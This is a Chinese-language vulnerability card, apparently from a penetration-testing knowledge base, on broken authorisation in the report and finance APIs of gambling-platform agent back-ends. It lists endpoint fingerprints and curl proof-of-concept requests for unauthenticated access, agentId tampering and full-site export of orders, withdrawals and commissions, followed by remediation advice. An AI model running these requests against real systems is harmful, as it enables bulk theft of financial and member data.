---
title: 报表/财务接口未授权（全站流水与代理佣金）
cve: 无（业务逻辑）
severity: high
cvss: 8.6
product: 包网/代理后台报表模块
versions: 任意
ports: 80, 443
keywords: report, finance, 报表, 流水, 佣金, 未授权
entry: /api/report/* 免认证或普通 token
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/api/report/bet        /api/report/finance       /api/report/agent
/api/finance/order     /api/admin/report/export
参数：startDate、endDate、agentId、pageSize
```

## 前置条件

- 普通账号（或完全未授权，取决于部署）。

## PoC

```bash
# 1) 未授权先试
curl -s 'https://target/api/report/bet?startDate=2024-11-01&endDate=2024-11-05&pageSize=10'
# 200 + 数据 ⇒ 未授权

# 2) 普通 token + 改 agentId
curl -s 'https://target/api/report/agent?agentId=1&startDate=2024-11-01' -H "Authorization: Bearer <普通 token>"

# 3) 导出接口（常漏鉴权，且能一次拉全量）
curl -s 'https://target/api/report/export?startDate=2024-01-01&endDate=2024-11-05' -o dump.xlsx
```

## 利用步骤

1. 未带 token 打一轮；再带普通 token 打一轮；对比 200/403。
2. 命中后改 `agentId`/`uid` 拿他人代理树与流水（配合 `agent-hierarchy-privilege.md`）。
3. 导出接口优先：一次拿到全站订单/提现/佣金，比翻列表快。
4. 数据用于证明影响面（多少会员、多少流水），**不要全文导出**。
5. 证据：一条列表请求 + 返回总条数 + 字段截图（脱敏）。

## 修复与缓解

- 报表接口统一鉴权 + 行级过滤（只返回自己代理树）。
- 导出走异步任务 + 权限校验 + 水印；大报表限速。
- 审计：谁在什么时间导出了多少行。

## 参考

- OWASP API Security Top 10：API1 BOLA / API5 BFLA。
